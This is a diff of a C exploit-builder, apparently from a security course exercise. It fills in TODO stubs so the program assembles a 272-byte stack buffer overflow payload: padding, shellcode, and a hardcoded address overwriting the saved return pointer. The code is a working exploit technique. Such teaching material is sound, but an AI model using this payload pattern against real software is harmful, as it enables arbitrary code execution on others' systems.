@@ -8,10 +8,16 @@
 
 int main(int argc, char *argv[])
 {
-  // TODO determin size of exploit
-  char exploit[0];
+  // Determine size of exploit
+  // buf 256 + saved RBP 8 + saved RIP 8 = 272
+  char exploit[272];
 
-  // TODO fill exploit buffer
+  // Fill exploit buffer
+  // p &buf -> (char (*)[256]) 0x7fffffffdc20
+  // change saved RIP to 0x7fffffffdc20
+  memset(exploit, 'U', sizeof(exploit));
+  memcpy(exploit, shellcode, sizeof(shellcode) - 1);
+  *(size_t *)(exploit + 264) = 0x7fffffffdc20;
 
   // Write the exploit buffer to a file
   write_xploit(exploit, sizeof(exploit), DEFAULT_OUTPUT);
